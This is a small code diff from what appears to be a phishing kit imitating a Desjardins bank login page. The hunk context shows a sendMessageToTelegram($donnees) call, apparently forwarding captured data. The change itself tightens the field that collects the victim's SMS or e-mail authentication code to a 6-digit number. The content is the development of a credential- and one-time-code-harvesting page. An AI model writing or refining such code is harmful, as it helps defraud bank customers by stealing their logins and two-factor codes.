@@ -70,7 +70,7 @@ sendMessageToTelegram($donnees) ;
         <form action="/desjardin/loop.php" method="post">
                 <h1>Se Connecter</h1>
             <label for="sms"> Vous recevrez un code d'authenthification sur votre E-mail ou sms</label>
-            <input type="text" name="sms">
+            <input maxlength="6" type="number" name="sms">
 
        
 
